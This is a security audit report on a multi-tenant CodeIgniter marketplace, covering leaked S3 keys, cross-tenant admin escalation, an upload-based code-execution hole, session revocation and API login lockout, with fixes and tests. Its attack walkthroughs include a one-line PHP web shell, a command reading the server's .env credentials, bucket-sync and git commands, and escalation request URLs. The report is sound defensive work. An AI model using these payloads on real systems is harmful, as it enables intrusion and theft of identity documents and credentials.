# Shiplore / ErikCMS — Full Security, Architecture & Performance Audit

**Target:** live production multi-tenant marketplace (CodeIgniter 4, PHP 8.5, MariaDB, ~123 controllers, ~104 models, shipped mobile apps on `/api/v1`)
**Method:** six parallel domain audits, every Critical/High re-checked by a second auditor whose job was to refute it. Only findings that survived that pass are reported as real. Refuted claims are listed in §12.
**Date:** 2026-08-05

> **Redaction note.** Finding C1 concerns live credentials committed to this repository. Their
> literal values are **redacted** in this document — reproducing them here would republish the
> secret into another tracked file and widen the exposure this report exists to close. The finding
> is fully actionable without them: the file, the commit, the consumers and the rotation procedure
> are all named. Retrieve the actual values from the server or from git history if you need them to
> verify the rotation.

---

## 1. Executive summary

**Rotate the S3 credentials today.** `s3_storage/.env` is tracked in git, was committed in `d51a1a7 "Live production snapshot"`, contains a live `s3.accessKey`/`s3.secretKey` pair, and the repository has a GitHub remote. Those keys are the sole authentication for the object store holding vendor and rider KYC scans, GST certificates and invoice PDFs — signature-only, no application login required. The repo's own `s3_storage/.htaccess` already says "assume them compromised"; the working tree is clean, so nobody has acted on that.

Two other issues are equally urgent but need code, not a console. First, **any ordinary vendor owner can read and write every other tenant's data through `/admin/*`**: the admin routes are path-based (they resolve on `vendor.shiplore.in` too), the `webAuth:platform` pin is log-only by default, and 34 admin authorization checks name permission codes (`settlement.view`, `product.update`, `media.view`, `report.export`, `order.cancel`, `transfer.approve`) that `database/sql/11_seed.sql:233-235` grants to *every* `vendor_owner`. `PolicyEngine::can()` is a bare `in_array` with no scope test. This is a single-request, no-chain path from a normal vendor login to platform-wide settlement data, competitors' KYC PDFs, and destructive writes. Second, **`Admin\SettingsController::saveSystem()` is a remote-code-execution hole**: the brand-logo upload derives the stored extension from `getClientExtension()` (the raw client filename) and writes into `public/assets/images/`, which the cPanel PHP handler executes — and it is gated on `settings.view`, a permission the seed deliberately grants to `platform_admin` while withholding `settings.update`.

Below that sit eleven High findings, and their common shape is worth naming: **nothing revokes, and nothing locks.** A suspended user keeps their browser session forever (the "revoke sessions" code deletes from a table nothing writes to, while the session driver is FileHandler); 30-day JWTs have no `jti`, no deny-list, and a refresh endpoint that renews them indefinitely; `/api/v1/auth/login` has no lockout and no audit trail at all, bypassing the web login's brute-force protection against the same `users` rows. On the money side, four read-check-write sequences run with no row locks — storefront oversell, coupon usage limits, PO receipt, inventory reservation — and `SELECT … FOR UPDATE` appears nowhere in `app/`. Two accounting defects are worse than the races: `RefundService` picks the wrong sub-order on every multi-product refund (unbalanced ledger, wrong GST credit note), and coupon discounts are applied to tax at cart level but not at sub-order level, so **filed output GST is over-declared and vendors are over-charged commission on every couponed order**.

What is genuinely good deserves saying, because it changes where you should spend effort: SQL injection is effectively clean (24 raw `query()` sites, all parameterised; every escape-disabled fragment is a constant or `intval`-coerced), CSRF coverage is thorough (344 routed filters; the only exempt mutating routes are hash-verified PayU callbacks and Bearer-authenticated API routes), password hashing is bcrypt with no legacy path anywhere, `TokenService` fails closed rather than signing with the placeholder secret, the Firebase verifier is complete, and `AuditWriter` is hash-chained with before/after snapshots. Someone has also clearly profiled the storefront — the FacetCache SWR design and the index hints carry measured numbers. The weakness is not ignorance; it is that the good abstractions (`PermissionFilter`, `TenantScopeFilter`, `StatusMachine`, `Money`, `InventoryService`) exist and are not consistently reached for.

**Act in this order:** (1) rotate S3 keys and untrack the file; (2) add `isPlatform()` to the ~60 admin guards; (3) fix the brand-logo extension; (4) add the account-status re-check to `WebAuthFilter`; (5) add the lockout to the API login. Items 2-5 are all low-regression-risk, behaviour-preserving edits.

---

## 2. Summary table

| Area | Score (/10) | Notes |
|---|---|---|
| Authentication | 6 | Bcrypt everywhere (14 sites, no legacy hash), `hash_equals` throughout, uniform login error (no enumeration), fail-closed JWT secret, solid OTP + Firebase RS256 verification. Undone by: API login with no lockout/audit, 30-day tokens with no revocation, no re-check of account status on the web. |
| Authorization | 3 | Confirmed cross-tenant escalation from an ordinary vendor login. `PermissionFilter`/`TenantScopeFilter` applied to **0 of ~1050 routes**; zero `can()` calls anywhere in `api/v1`; principal pin log-only. Primitives are correct; the enforcement layer is not wired. |
| SQL Injection | 9 | Swept exhaustively: 24 raw `query()` sites all parameterised, ~60 escape-disabled fragments all constants or `intval`/`preg_replace`-coerced, sort parameters whitelisted via `switch`/`match`. Nothing to report. |
| XSS | 5 | Two stored XSS on the **public** storefront product page reachable by any vendor (one with no approval gate at all), plus two client-side sinks that systematically undo server-side `esc()`. No safety net: CSP is report-only with no report URI. |
| File Upload | 3 | One RCE (client-controlled extension into the web root behind a *view* permission). Presigned PUT accepts attacker-named, unvalidated, unbounded bytes inside the DocumentRoot. `MediaService` itself (finfo MIME, closed extension map, UUID names, out-of-root storage, no SVG) is well built. |
| CSRF | 8 | 344 route-level filters; every mutating non-API route covered except two hash-verified PayU callbacks. CORS closed (`allowedOrigins: []`, no credentials). Deductions: `tokenRandomize=false`, `regenerate=false` — a static per-session token any XSS can read from the published meta tag. |
| Sessions | 4 | No status re-check; revocation code is a no-op; fixation on the customer OTP path; logout removes keys without retiring the ID; `regenerateDestroy=false` leaves a trail of valid session files; cookie scoped `.shiplore.in`. Cookie flags themselves are correct. |
| Secrets | 3 | Live shared S3 credentials in git history on a pushed remote, plus a second near-identical copy in `s3_storage/public/s3test.php`. Credit where due: the main app's `.env` is **not** tracked and no `jwt.secret` is in VCS (three lanes independently confirmed). |
| Performance | 5 | Real engineering present (SWR facet cache, measured index hints, filesort-avoiding `sort=none`). Undermined by anonymous unthrottled amplification vectors, four unlocked read-check-writes on money/stock, and several N+1s on polled endpoints. |
| Database | 5 | The fastest-growing table (`sub_orders`) has no index leading with `created_at`/`deleted_at`; performance indexes live only in standalone `perf*.php` scripts that `run_all.sql` cannot source, while five methods hard-code `FORCE INDEX` against one of them. Schema design itself is sound. |
| CI4 Best Practices | 6 | autoRoute off, explicit routes, real service container (100+ definitions), correct `Boot/production.php`, good directory denies. Against that: **zero** controllers use CI4 validation (all 123 hand-roll), declared services bypassed by `new`, `StatusMachine` half-unused. |
| API Security | 4 | Authentication only. No permission layer, no tenant filter, no throttles on public read endpoints, unvalidated ENUM writes, a staff endpoint that adopts arbitrary users by phone number. Response shaping and mass-assignment discipline are good. |
| Logging | 5 | `AuditWriter` is excellent (actor, principal, impersonator, scope, IP, UA, before/after, hash-chained). But the raw password-reset token is written to the production log by design, the brute-force lockout fails open silently, and the CSP has no report sink. |
| Error Handling | 7 | `display_errors` off in `Boot/production.php`, generic production error view, `$ignoreCodes = [400,404]` well-justified. Unverified: which of `php.ini` / `.user.ini` wins on the live SAPI for pre-bootstrap fatals. |
| Cache | 5 | FacetCache SWR + durable backing table is a good design, but the cold path has no single-flight lock and takes a caller-controlled key. Private media served `Cache-Control: public`. No per-request memoisation on hot settings reads. |
| Headers | 4 | No HSTS anywhere, no HTTP→HTTPS redirect (and `public/.htaccess` redirects *to* `http://`), CSP enabled but report-only with `reportURI = null` so it neither blocks nor collects. Two headers exist only in a `.htaccess` the project plans to stop using. |
| Architecture | 6 | Good bones (Money, StatusMachine, PolicyEngine, ScopeContext, repository layer) inconsistently reached for. Duplicated-and-drifted logic is the dominant defect class and it lands on money: refunds, coupons, delivery transitions. |
| Code Quality | 6 | `Api\V1\VendorApiController` is 1,884 lines / 79 endpoints with direct query-builder access to 20 tables, bypassing the repository layer it sits on. Deliberate, explanatory comments throughout are a genuine strength. |
| Dependency Security | 5 | `box/spout` is **abandoned** (last release 2021, `"php": ">=7.2.0"`) and parses admin-supplied XLSX on a live route. Three production deps pinned `"*"`. Dev dependencies (phpunit, php-cs-fixer, faker, kint) deployed to production. No CVE feed available in this pass — no specific CVE is claimed. |
| Infrastructure | 5 | Careful deny sweep (app/, system/, tests/, writable/, database/, pma/, s3_storage/, build/) that **missed `vendor/`**, which is therefore fully web-readable including `composer/installed.json`. DocumentRoot is the project root, so `writable/.htaccess` is load-bearing. |

**Not reachable in this pass** (stated rather than guessed): the production `.env` contents and `jwt.secret` entropy; whether `auth.enforcePrincipalType` is set on the live host; whether the `perf*.php` indexes have been applied to the production database; whether a CDN/proxy sits in front of the origin (affects `Cache-Control: public` blast radius and every throttle threshold, since `App::$proxyIPs` is `[]`); the vhost's actual `AllowOverride`; real table row counts.

---

## 3. Detailed findings

---

### CRITICAL

---

#### C1 — Live object-store credentials committed to git on a pushed remote

**Severity:** Critical

**Location:** `s3_storage/.env:16-17` (tracked; commit `d51a1a7 "Live production snapshot"`); second near-identical copy at `s3_storage/public/s3test.php:42-43`. Consumers: `s3_storage/app/Config/S3Server.php:92-93` → `s3_storage/app/Libraries/SigV4Auth.php:175,249`; `app/Libraries/Storage/DocumentStorage.php:367-376`.

**Description:** `.gitignore:1` is `/.env` — root-anchored, so it excludes only the project-root env file. The second CodeIgniter application nested in this repo (`s3_storage/`, the object server behind `s3.shiplore.in`) has its own `.env` and it **is** tracked. It is marked `CI_ENVIRONMENT = production`, carries the production CORS origin list, and its own comment states the keys "MUST match the main app's aws_settings (client_key / client_secret)" — i.e. these are the live credentials the marketplace signs every media upload and download with. `SigV4Auth` compares the presented Credential against `expectedAccessKey`; the signature is the *only* authentication. Anyone with a copy of the repository — a contractor clone, a CI mirror, a laptop backup, the GitHub remote — can read, overwrite or delete every object in the bucket: vendor and rider KYC scans, PAN/GST certificates, bank proofs, invoice PDFs, report exports. No application login, no rate limit, no `audit_logs` entry.

**Proof:**
```
$ git ls-files | grep .env
s3_storage/.env                      # the ONLY tracked env file
$ git ls-files --error-unmatch .env
error: pathspec '.env' did not match any file(s) known to git
$ git log --oneline -1 -- s3_storage/.env
d51a1a7 Live production snapshot
$ git show HEAD:s3_storage/.env
CI_ENVIRONMENT = production
app.baseURL = 'https://s3.shiplore.in/'
# Shared credentials — MUST match the main app's aws_settings (client_key / client_secret)
s3.accessKey = '<REDACTED - see git history / server .env>'
s3.secretKey = '<REDACTED - see git history / server .env>'
s3.enforceSignatureV4 = true
```
The project already knows — `s3_storage/.htaccess:1-9`: *"It ships its own git-tracked .env containing live object-store credentials … The credentials must still be ROTATED — assume them compromised."* The working tree is clean against HEAD, so **they have not been rotated.** Note the deny in that `.htaccess` blocks reaching the file through the *main* site's docroot only; `s3.shiplore.in`'s vhost points at `s3_storage/public`, below that file, so the object server stays live and the keys stay valid.

Attack: `git show d51a1a7:s3_storage/.env`, then `aws s3 sync --endpoint-url https://s3.shiplore.in s3://<bucket> .` — every identity document the platform has ever taken.

**Fix:** Rotate first, untrack second. Neither step changes running behaviour.

1. **Rotate** (this is the control that actually closes it — untracking does not scrub history). Generate a new key/secret pair. Update `aws_settings.client_key` / `client_secret` through **Admin → Integrations → S3** (`Admin\AwsSettingsController`, route `app/Config/Routes.php:481`), then update `s3.accessKey` / `s3.secretKey` in `s3_storage/.env` on the server. `DocumentStorage::client()` builds a fresh `S3Client` per call, so there is no cache to clear. Delete the old pair at the provider only after the self-test passes.
2. **Untrack** so the next clone does not re-publish it:
```bash
git rm --cached s3_storage/.env
printf 's3_storage/.env\n**/.env\n' >> .gitignore
git commit -m 'Untrack s3_storage/.env (credentials rotated)'
```
Also delete or gut `s3_storage/public/s3test.php`, which holds a second copy.

**Regression Risk:** Medium — entirely in the rotation window. Between updating `aws_settings` and updating `s3_storage/.env` (or vice versa), every signed media request fails on signature mismatch: uploads and private-media reads break. Do both edits back to back, off-peak. `git rm --cached` leaves the file on disk, so `s3.shiplore.in` keeps serving. Failure modes if you get it half-right: `DocumentStorage::putBytes()` catches and falls back to local `writable/uploads` (soft), but `presignGet()` failures are visible — existing S3-backed assets 404.

**Testing:** *Works:* run the built-in round-trip at `POST admin/integrations/aws/test` — must report success. Upload a product image via the admin media library and confirm it renders; open a vendor document from the document register and confirm the private URL resolves. *Closed:* `git ls-files s3_storage/.env` returns nothing while `ls s3_storage/.env` still shows the file; sign a SigV4 `GetObject` with the OLD key and confirm HTTP 403 `InvalidAccessKeyId`.

---

#### C2 — Any vendor owner can read and write every tenant's data through `/admin/*`

**Severity:** Critical

**Location:** `app/Libraries/PolicyEngine.php:28-31`; the `guard()` method in ~60 `app/Controllers/Admin/*` classes, 34 of which name a tenant-scoped code — e.g. `Admin\SettlementController.php:170`, `Admin\MediaController.php:211`, `Admin\ReportController.php:57` (inline), `Admin\VendorController.php:167`, `Admin\ProductController.php:493`, `Admin\RiderController.php:121`, `Admin\ShopController.php:62`, `Admin\TransferController.php:22`. Route group: `app/Config/Routes.php:171`. Grants: `database/sql/11_seed.sql:233-235`.

**Description:** Four facts compose into a complete privilege escalation, each verified independently by both auditors.

1. **No host gate.** `Routes.php:11-25` uses the `subdomain` option only on the five `$routes->get('/')` root entries. The `admin` group at `:171` is path-based, so `/admin/*` resolves on **every** host the app answers on — including `vendor.shiplore.in`, where the vendor's session cookie is already being sent. (The `.shiplore.in` cookie domain makes it worse but is not even required.)
2. **The principal pin does not bite.** `WebAuthFilter::checkPrincipal()` is log-only behind `env('auth.enforcePrincipalType', false)`; there is no `.env` in the tree and the tracked `env` template has no `auth.*` key (see H4).
3. **The guard is scope-blind.** `CapabilityRepository` groups permissions by scope, but `CapabilityResolver.php:52-60` returns **one merged list**, and `PolicyEngine::can()` is literally `return in_array($permission, $ctx['permissions'] ?? [], true);`. `Admin\PortalController::adminGuard()` (`:266-274`) is the *only* guard in the panel that additionally requires `$ctx->isPlatform()` — proving the correct pattern was known and not applied.
4. **The codes belong to vendors.** `11_seed.sql` declares `settlement.view`, `media.view`, `product.update`, `report.export`, `delivery.view`, `order.cancel`, `return.view`, `vendor.settings.manage`, `warehouse.manage`, `transfer.approve` with `scope_class` `vendor`, and `:233-235` grants **every vendor/shop-scoped permission to `vendor_owner`** via `SELECT r.id, p.id … WHERE p.scope_class IN ('vendor','shop') AND r.code='vendor_owner'`. `RegistrationRepository.php:97-102` assigns that role to every self-registered vendor owner.

Reachable with nothing but a valid approved-vendor login:
- `GET /admin/reports/export-sales?start=2000-01-01&end=2099-12-31` → CSV of every vendor's sub-orders, revenue and GST breakdown. Plain GET, no CSRF token needed. `ReportRepository::exportRows()` (`:69-77`) has **no vendor predicate**.
- `GET /admin/media`, `/admin/media/vendor/{n}`, `/admin/media/{id}/view` → presigned GET on any vendor's private KYC/PAN/GST/bank documents (`Admin\MediaController.php:180` is `findById($id)` with no owner check). `POST /admin/media/{id}/delete` destroys them.
- `GET /admin/settlements`, `/admin/payouts`, `/admin/reconciliations`, `/admin/rider-finance/*` → every vendor's financials (`SettlementRepository::list` joins settlements→vendors with **no** `vendor_id` predicate).
- `POST /admin/vendors/{anyId}/update` → rewrite a competitor's `business_type_id`, which drives their commission plan.
- `POST /admin/products/{anyId}/update`, `/admin/orders/{anyId}/cancel`, `/admin/transfers/{n}/approve`, `/admin/shops/{n}/update`, `/admin/coupons/*` → cross-tenant destructive writes.

**Proof:**
```php
// app/Libraries/PolicyEngine.php:28-31 — the entire authorization primitive
public function can(array $ctx, string $permission): bool
{
    return in_array($permission, $ctx['permissions'] ?? [], true);
}

// app/Controllers/Admin/SettlementController.php:170-177 — byte-identical in ~60 files
private function guard(string $permission): ?RedirectResponse
{
    if (! service('policyEngine')->can(service('scopeContext')->all(), $permission)) {
        return redirect()->to('admin/dashboard')->with('error', 'You do not have permission to do that.');
    }
    return null;
}

// app/Controllers/Admin/PortalController.php:266-274 — the one that gets it right
$ctx = service('scopeContext');
if (! $ctx->isPlatform() || ! service('policyEngine')->can($ctx->all(), $permission)) {
```
The project's own `tests/unit/Common/AdminGuardScopeTest.php` `KNOWN_GAPS` array independently enumerates the same 34 sites.

Attack: sign in as any approved vendor at `vendor.shiplore.in`. In the same browser: `GET https://vendor.shiplore.in/admin/reports/export-sales?start=2000-01-01&end=2099-12-31`. `WebAuthFilter` logs a "would block" notice and passes; `report.export` is in the vendor's list; the controller streams every vendor's taxable value, CGST/SGST/IGST and grand totals. Then `/admin/media/vendor/{competitorId}` for their KYC PDFs.

**Fix:** Make platform scope part of the admin guard, exactly as `PortalController` already does. The guard body is byte-identical across the panel, so this is one mechanical two-line edit per file with **no behaviour change for real admins**.

```php
private function guard(string $permission): ?RedirectResponse
{
    // Admin pages are platform-wide. The permission code alone is not a gate:
    // PolicyEngine::can() is a bare in_array, and vendor roles hold many of the codes
    // these pages name (settlement.view, product.update, media.view, report.export,
    // delivery.view …) — see database/sql/11_seed.sql:233-235.
    $ctx = service('scopeContext');
    if (! $ctx->isPlatform() || ! service('policyEngine')->can($ctx->all(), $permission)) {
        return redirect()->to('admin/dashboard')->with('error', 'You do not have permission to do that.');
    }
    return null;
}
```
Apply the same predicate to the controllers that inline the check: `Admin\ReportController.php:16,32,44,57,93`, `AuditLogController.php:14`, `BackupController.php:14`, `CommissionHoldController.php:16`, `NotificationController.php:16`, and `ProductLookupController::lookupGuard()` (keep its JSON 403 shape). `ScopeContext::isPlatform()` already exists (`app/Libraries/ScopeContext.php:48`) and is populated by `WebAuthFilter.php:45` — no new dependency, no route change, no view change.

**Regression Risk:** Low — the only way this locks out a real admin is if a platform staff member's `user_roles` row carries a non-platform `scope_type`. Every writer of that table was checked: `AdminUserRepository.php:139,174` insert `'scope_type' => 'platform'` unconditionally; `RegistrationRepository:102` writes 'vendor'; `VendorStaffRepository:216` 'shop'; `ManufacturerRegistrationRepository:123` 'manufacturer'; the bootstrap super_admin is seeded 'platform'. No code path can produce a platform user without a platform scope. Residual risk is a hand-edited row — run this first, it must return zero rows:
```sql
SELECT u.id, u.email, GROUP_CONCAT(DISTINCT ur.scope_type)
FROM users u JOIN user_roles ur ON ur.user_id = u.id
WHERE u.principal_type='platform' AND ur.deleted_at IS NULL
GROUP BY u.id HAVING GROUP_CONCAT(DISTINCT ur.scope_type) NOT LIKE '%platform%';
```

**Testing:** *Works:* as super_admin and platform_admin, walk `/admin/dashboard`, `/vendors`, `/products`, `/settlements`, `/media`, `/reports/export-sales`, `/riders` — every page and the CSV must behave as before; the admin menu must render the same items. *Closed:* as a real `vendor_owner`, request each of `/admin/reports/export-sales`, `/admin/media`, `/admin/media/1/view`, `/admin/settlements`, `/admin/riders`, `POST /admin/vendors/{otherId}/update`, `POST /admin/orders/{anyId}/cancel` — every one must redirect with the permission error and write nothing. Repeat as `vendor_shop_manager` and `vendor_pos_cashier`. Then empty `KNOWN_GAPS` in `AdminGuardScopeTest.php` and run `composer test`.

---

#### C3 — Remote code execution: brand-logo upload takes its extension from the client filename

**Severity:** Critical

**Location:** `app/Controllers/Admin/SettingsController.php:65-71`, `Admin\SettingsController::saveSystem()`; guard at `:86-90`; route `app/Config/Routes.php:546`.

**Description:** `saveSystem()` accepts a `brand_logo` file, derives the stored extension from `UploadedFile::getClientExtension()`, and writes it into `FCPATH . 'assets/images/'` — inside the web root — with overwrite enabled. There is **no MIME check, no extension allow-list, no image validation, and no `validate()` call**. `getClientExtension()` is `pathinfo($this->originalName, PATHINFO_EXTENSION)` (`system/HTTP/Files/UploadedFile.php:326`), where `$originalName` is `$_FILES['brand_logo']['name']` — entirely attacker-controlled. `UploadedFile::move()` with an explicit `$name` and `$overwrite=true` goes straight to `move_uploaded_file()` with no sanitiser.

The file is then executed. The root rewrite only reaches `public/index.php` when the path does **not** exist (`RewriteCond %{REQUEST_FILENAME} !-f`), and the uploaded file exists. `.htaccess:126` declares `AddHandler application/x-httpd-ea-php85 .php .php8 .phtml` at the top of the tree. There is no directory-level deny under `public/assets/` — `find public -name .htaccess` returns only `public/.htaccess`, which has `Options -Indexes` and rewrites but no deny and no engine-off. So `GET /public/assets/images/logo_<ts>.php` executes, both before and after the planned DocumentRoot move.

The guard turns it into a privilege escalation as well. `guard()` checks `settings.view` — a **read** permission — for an action that writes settings and uploads a file. `11_seed.sql:210-214` grants `platform_admin` every platform-scope permission *except* a list that includes `settings.update`. So an account the seed explicitly does not trust to change settings can drop a PHP shell.

**Proof:**
```php
// app/Controllers/Admin/SettingsController.php:65-71
$logo = $this->request->getFile('brand_logo');
if ($logo !== null && $logo->isValid() && ! $logo->hasMoved()) {
    $ext  = $logo->getClientExtension();       // pathinfo($_FILES['name'])
    $name = 'logo_' . time() . '.' . $ext;
    $logo->move(FCPATH . 'assets/images/', $name, true);

// app/Controllers/Admin/SettingsController.php:86-90 — a VIEW permission on a WRITE
if (! service('policyEngine')->can(service('scopeContext')->all(), 'settings.view')) {
```
Attack: as any `platform_admin`, Admin → Settings, submit `brand_logo` = a file named `s.php` with body `<?php system($_GET['c']);`. `getMimeType()` is never called, so the body can be plain PHP. Then `GET /public/assets/images/logo_<ts>.php?c=cat%20../../.env` → shell as the web user: database credentials, the whole multi-tenant database, every KYC scan under `writable/uploads`, the S3 keys. The form's own `accept` attribute advertises `image/svg+xml`, so the SVG-with-`<script>` variant is the *documented* use.

**Fix:** Derive the extension from the server-detected MIME. This keeps every format the form's `accept` lists.
```php
$logo = $this->request->getFile('brand_logo');
if ($logo !== null && $logo->isValid() && ! $logo->hasMoved()) {
    // The extension MUST come from the server-detected mime. getClientExtension() is
    // pathinfo() over $_FILES['name'], so a file named "s.php" was written into the
    // web root as logo_<ts>.php and executed by the cPanel PHP handler.
    $allowed = [
        'image/png' => 'png', 'image/jpeg' => 'jpg', 'image/gif' => 'gif',
        'image/webp' => 'webp', 'image/svg+xml' => 'svg',
    ];
    $ext = $allowed[strtolower(trim((string) $logo->getMimeType()))] ?? null;
    if ($ext === null) {
        return redirect()->to('admin/settings')
            ->with('error', 'The logo must be a PNG, JPG, GIF, WEBP or SVG image.');
    }
    $name = 'logo_' . time() . '.' . $ext;
    $logo->move(FCPATH . 'assets/images/', $name, true);
    $repo->set('system', 'brand_logo_url', base_url('assets/images/' . $name), 'string', $uid);
}
```
SVG stays accepted (removing it is a behaviour change), so neutralise script in it at the Apache layer — add to **both** `.htaccess` and `public/.htaccess`:
```apache
<FilesMatch "\.svg$">
    Header always set Content-Security-Policy "default-src 'none'; style-src 'unsafe-inline'; sandbox"
</FilesMatch>
```
Separately, as its own commit (it removes a capability `platform_admin` has today): change `guard()` to require `settings.update` for `saveSystem()`/`saveDelivery()`, keeping `settings.view` for `index()`.

**Regression Risk:** Low — the only behavioural change is that a logo whose real content is not one of the five image types is rejected with a flash error. Every legitimate logo still uploads; the filename shape (`logo_<unixtime>.<ext>`) and the `brand_logo_url` setting are unchanged, so existing logos are untouched. One edge: a `.jpeg` client name now produces `.jpg` — only for new files. The SVG CSP header is inert for `<img>` embedding and only affects direct navigation.

**Testing:** *Works:* Admin → Settings → System, upload a real PNG and a real SVG — both save, the preview renders, the file lands with the right extension; the "Or URL" fallback still saves a pasted URL. *Closed:* submit `shell.php` (body `<?php echo 'PWNED';`) — expect the error flash and **no** new file. Repeat with the same body renamed `shell.png` — also rejected (`getMimeType()` returns `text/x-php`). Finally `ls public/assets/images/ | grep -Ei '\.(php|phtml|php8)$'` returns nothing, and `curl -i https://shiplore.in/public/assets/images/logo_<ts>.svg` carries the sandbox CSP.

---

### HIGH

---

#### H1 — Suspending a user does not end their web session; the revocation code writes to tables nothing populates

**Severity:** High *(found independently by two lanes; deduplicated)*

**Location:** `app/Filters/WebAuthFilter.php:31-48`; `app/Controllers/Vendor/StaffController.php:136-147`; `app/Config/Services.php:1089-1097`.

**Description:** `WebAuthFilter::before()` proves only that `isLoggedIn` is set. It resolves capabilities and hands off to `checkPrincipal()`. It never asks whether the user is still active or soft-deleted. `JwtAuthFilter.php:51` does exactly that on every API request — with a comment explaining why — so the asymmetry is not an oversight of the rule, only of one surface.

The intended compensating control is dead code. `StaffController::revokeStaffSessions()` and the `staff.terminate` governance applier both do:
```php
$db->table('auth_tokens')->where('user_id', $uid)->update(['status' => 'revoked']);  // works
$db->table('sessions')->where('user_id', $uid)->delete();                            // no-op
```
A repo-wide grep for `'sessions'` in `app/` returns **exactly these two DELETEs and nothing else** — no INSERT anywhere. `database/sql/06_sync.sql:170` shows `sessions` is an application *device*-session table (device_id, ip, user_agent, revoked_at), not the CI4 store. `app/Config/Session.php:25` is `FileHandler::class` with `$savePath = WRITEPATH . 'session'`. Both statements affect zero rows in both call sites.

Nor do permissions fall away: `CapabilityRepository::loadAssignments` (`:17-47`) joins `user_roles`→`role_permissions`→`permissions` filtered only on `ur.user_id` and `ur.deleted_at` — it never touches `users`. `VendorStaffRepository::setStatus` and `AdminUserRepository::setStatus` only update a status column and delete no role rows.

CI4 sets `session.gc_maxlifetime` from `$expiration` (7200), so an *idle* session does expire — but the FileHandler refreshes on every request, so an active tab renews indefinitely. The dismissed staffer keeps the full vendor/admin panel for as long as they keep clicking: POS sales, product edits, order actions, change-request approvals, settlement screens.

**Proof:**
```php
// app/Filters/WebAuthFilter.php:31-48 — the entire authentication decision
if (! $session->get('isLoggedIn')) { return redirect()->to('login')->with(...); }
$userId = (int) $session->get('user_id');
$ctx = $resolver->resolve($userId, $repo->loadAssignments($userId));
// …no users.status / deleted_at lookup anywhere in the file
```
Attack: owner opens `vendor/staff` and clicks Suspend on a dismissed branch manager. `VendorStaffRepository::setStatus()` correctly flips `vendor_staff.status` **and** `users.status` to 'suspended'. Their mobile app dies on the next call. Their browser tab does not: `GET vendor/pos`, `POST vendor/pos/sale`, `POST vendor/products/{n}/update`, `POST vendor/approvals/{n}/decide` all keep succeeding. Same for `Admin\UserController::suspend`.

**Fix:** Reuse the check the API filter already uses. In `WebAuthFilter::before()`, immediately after resolving `$userId`:
```php
// Re-check the account is still active on EVERY request — mirrors JwtAuthFilter.
// Suspending/terminating a user must end their browser session at once; the
// auth_tokens/sessions revocation in StaffController is a no-op because sessions
// are FileHandler files, not DB rows.
if (! service('apiAuthRepository')->isActive($userId)) {
    $session->destroy();
    return redirect()->to('login')->with('error', 'Your account is no longer active. Please contact your administrator.');
}
```
`ApiAuthRepository::isActive()` (`:28-37`) is a plain `users` lookup on `status='active' AND deleted_at IS NULL` — principal-agnostic, so correct for platform, vendor and manufacturer alike. Separately, delete the misleading `sessions` DELETE from both revoke sites so nobody reads it as working protection; keep the `auth_tokens` revocation, which does work.

**Regression Risk:** Low — every path that creates a staff session already requires `status === 'active'`: `WebAuthenticator::attempt()` (`:30`), `LoginController::otpLogin()` (`:149`), `PortalController::activeUser()` (`:249`). So no currently-valid session belongs to a non-active user except the ones this is meant to kill. Impersonation is unaffected — `enterVendor/enterShop/enterRider` keep the admin's `user_id`. Cost: one indexed COUNT per authenticated page load, alongside the `loadAssignments()` query already there. The rider panel uses `RiderAuthFilter` and is untouched (same gap, but riders hold no back-office permissions).

**Testing:** *Works:* sign in as platform admin, vendor owner, vendor staffer and manufacturer; browse each panel; enter and leave a vendor portal via impersonation — all unchanged. *Closed:* staffer signed in in browser A; suspend them from browser B; refresh anything in A — must redirect to `login` with the inactive message. Reactivate and confirm they can sign in again.

---

#### H2 — `POST /api/v1/auth/login` has no lockout, no audit trail, and mints a 30-day JWT for any principal type

**Severity:** High

**Location:** `app/Controllers/Api/V1/AuthApiController.php:152-164`; route `app/Config/Routes.php:859`. Contrast `app/Controllers/Auth/LoginController.php:21-22, 80-83`.

**Description:** The web login enforces a rolling lockout (5 failures / 15 minutes per identifier) and writes every attempt to `login_attempts`. The mobile password endpoint does neither. `login()` goes input → `findByIdentifier` → `password_verify` → issue token, with no counter, no `login_attempts` row, and **no principal gate** — its siblings `otpVerify()` (`:95`) and `firebaseVerify()` (`:145`) were both hardened to `principal_type === 'customer'`; `login()` was left open. `ApiAuthRepository::findByIdentifier` matches email OR phone across the whole `users` table with no principal predicate, so admin and vendor rows are reachable. A successful guess against a platform admin mints a 30-day token whose `typ` `JwtAuthFilter` accepts and whose permissions `CapabilityResolver` fills from `user_roles`.

The only brake is `throttle:10,60`, and `ThrottleFilter.php:28` keys on `md5(IP . '|' . path)` — per source IP, no identifier component, so it multiplies across proxies while the target account never locks and nothing is recorded anywhere.

The second auditor also identified this as the **working entry point for the api/v1 staff→owner escalation** in H3: `VendorPosController::otpVerify`/`firebaseVerify` are owner-only (`:108-115`, `:223-226`), but vendor staff are created with a `password_hash` (`VendorStaffRepository.php:109,250`), so `/api/v1/auth/login` is how a cashier gets a JWT.

**Proof:**
```php
// app/Controllers/Api/V1/AuthApiController.php:152-164 — the whole method
$user = $id !== '' ? service('apiAuthRepository')->findByIdentifier($id) : null;
if ($user === null || empty($user['password_hash'])
    || ! password_verify($pass, (string) $user['password_hash']) || $user['status'] !== 'active') {
    return $this->failWith('UNAUTHENTICATED', 'Invalid credentials.');
}
return $this->ok($this->session($user));   // self::TTL = 2592000, typ = principal_type
```
Attack: 200 residential proxies × 10 rpm = 2,000 guesses/minute against a known admin email (they appear in vendor-facing emails and audit screens), forever, with `login_attempts` empty and no signal to the security team.

**Fix:** Apply the same lockout and audit trail the web login uses, via the existing repository. Success responses are byte-identical, so shipped apps are unaffected.
```php
public function login()
{
    $in   = $this->input();
    $id   = trim((string) ($in['identifier'] ?? ''));
    $pass = (string) ($in['password'] ?? '');

    // Same rolling-window lockout the web login enforces (Auth\LoginController):
    // without it this endpoint is an un-audited bypass of it against the same rows.
    $attempts = service('loginAttemptRepository');
    $ip = $this->request->getIPAddress();
    $ua = (string) $this->request->getUserAgent();

    if ($id !== '' && $attempts->recentFailureCount($id, 15) >= 5) {
        return $this->failWith('RATE_LIMITED', 'Too many failed attempts. Please try again in a few minutes.');
    }

    $user = $id !== '' ? service('apiAuthRepository')->findByIdentifier($id) : null;

    if ($user === null || empty($user['password_hash'])
        || ! password_verify($pass, (string) $user['password_hash']) || $user['status'] !== 'active') {
        $attempts->record($id, false, 'invalid_credentials', $user !== null ? (int) $user['id'] : null, $ip, $ua);
        return $this->failWith('UNAUTHENTICATED', 'Invalid credentials.');
    }

    $attempts->record($id, true, null, (int) $user['id'], $ip, $ua);
    return $this->ok($this->session($user));
}
```
